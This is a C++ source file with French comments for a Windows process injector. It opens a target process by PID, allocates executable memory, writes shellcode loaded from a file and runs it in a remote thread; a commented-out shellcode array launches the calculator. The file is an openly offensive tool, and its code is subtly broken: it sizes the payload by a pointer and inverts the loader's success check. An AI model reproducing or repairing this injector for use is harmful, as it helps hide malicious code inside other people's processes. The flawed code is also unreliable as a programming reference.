#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <string>
using namespace std;

DWORD PID = NULL;
DWORD TID = NULL;
LPVOID buffer = NULL;
HANDLE hProcess = NULL;
HANDLE hThread = NULL;

//ouvre la calculatrice
//unsigned char shellcode[] = "\x55\x48\x89\xE5\x48\x81\xEC\x90\x00\x00\x00\x48\x31\xC0\x65\x48\x8B\x04\x25\x30\x00\x00\x00\x48\x8B\x40\x60\x48\x8B\x40\x18\x48\x8B\x40\x20\x48\x8B\x00\x48\x8B\x00\x48\x8D\x40\xF0\x48\x8B\x40\x30\x48\x31\xDB\x8B\x58\x3C\x48\x01\xC3\x48\x81\xC3\x88\x00\x00\x00\x48\x31\xC9\x8B\x0B\x48\x01\xC1\x48\x89\x8D\x70\xFF\xFF\xFF\x48\x31\xD2\x8B\x51\x1C\x48\x01\xC2\x48\x89\x55\x90\x48\x31\xDB\x8B\x51\x20\x48\x01\xC2\x48\x89\x55\xA0\x48\x31\xC9\x48\x31\xD2\x51\x48\xB9\xFF\x57\x69\x6E\x45\x78\x65\x63\x48\xC1\xE9\x08\x51\x54\x48\x31\xC9\xB1\x07\x51\x41\x58\x41\x59\x4D\x31\xE4\x4C\x89\xC1\x4C\x89\xCE\x48\x8B\x55\xA0\x42\x8B\x14\xA2\x49\xFF\xC4\x4C\x8D\x1C\x02\x4C\x89\xDF\xF3\xA6\x75\xE4\x48\x83\xC4\x10\x49\xFF\xCC\x48\x31\xFF\x48\x31\xD2\xB2\x04\x48\x01\xD7\x50\x48\x89\xF8\x4C\x89\xE6\x48\xF7\xEE\x48\x89\xC6\x58\x48\x8B\x7D\x90\x48\x8D\x3C\x37\x8B\x3F\x48\x01\xC7\x48\xBB\x41\x41\x41\x41\x2E\x65\x78\x65\x48\xC1\xEB\x20\x53\x48\xBB\x6D\x33\x32\x5C\x63\x61\x6C\x63\x53\x48\xBB\x77\x73\x5C\x73\x79\x73\x74\x65\x53\x48\xBB\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x53\x54\x59\x48\xFF\xC2\x48\x83\xEC\x20\xFF\xD7";

int getShellcode(const char* path, char** shellcode);

int main(int argc, char* argv[])
{
	char* shellcode = NULL;

	if (argc < 3) {
		printf("%s pas de PID ! format : program.exe <PID> <Path to shellcode>", "[!]");
		return EXIT_FAILURE;
	}

	if (!getShellcode(argv[2], &shellcode))
	{
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("%s tentative d'ouverture d'un handle sur le processus (%ld)\n", "[*]", PID);
	
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL)
	{
		printf("%s impossible d'ouvrir un handle sur le processus (%ld), erreur: %ld", "[!]", PID, GetLastError());
		return EXIT_FAILURE;
	}
	
	printf("%s a obtenu un acces au processus !\n--> 0x%p\n", "[+]", hProcess);
	

	printf("%s allocation de %zu-octets avec les permissions PAGE_EXECUTE_READWRITE dans le processus (%ld)", "[+]", sizeof(shellcode), PID);
	buffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

	
	printf("%s ecriture du shellcode dans le processus (%ld)\n", "[+]", PID);
	WriteProcessMemory(hProcess, buffer, shellcode, sizeof(shellcode), NULL);
	
	printf("%s creation d'un thread dans le processus (%ld)\n", "[+]", PID);
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, 0, &TID);

	if (hThread == NULL)
	{
		printf("%s impossible de creer un thread dans le processus (%ld), erreur: %ld", "[!]", PID, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s attente de la fin du thread dans le processus (%ld)\n", "[+]", PID);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s le thread a ete execute avec succes dans le processus (%ld)\n", "[+]", PID);

	CloseHandle(hThread);
	CloseHandle(hProcess);
	free(shellcode);

	printf("%s le shellcode a ete execute avec succes dans le processus (%ld)\n", "[+]", PID);

	return EXIT_SUCCESS;
}

//chatgpt
int getShellcode(const char* path, char** shellcode) 
{
	FILE* file;
	if (fopen_s(&file, path, "r") != 0) {
		printf("%s Le chemin d'acces au fichier contenant le shellcode n'est pas valide !", "[!]");
		return 1;
	}

	fseek(file, 0, SEEK_END);
	long fileSize = ftell(file);
	rewind(file);

	*shellcode = (char*)malloc((fileSize + 1) * sizeof(char));
	if (*shellcode == NULL) {
		printf("%s l'allocation de la memoire utilise pour stocke le shellcode a echoue !", "[!]");
		fclose(file);
		return 1;
	}

	size_t bytesRead = fread(*shellcode, sizeof(char), fileSize, file);
	if (bytesRead != fileSize) {
		printf("%s La lecture du fichier qui contient le shellcode a echoue !", "[!]");
		fclose(file);
		free(*shellcode);
		return 1;
	}

	(*shellcode)[fileSize] = '\0';
	fclose(file);

	return 0;
}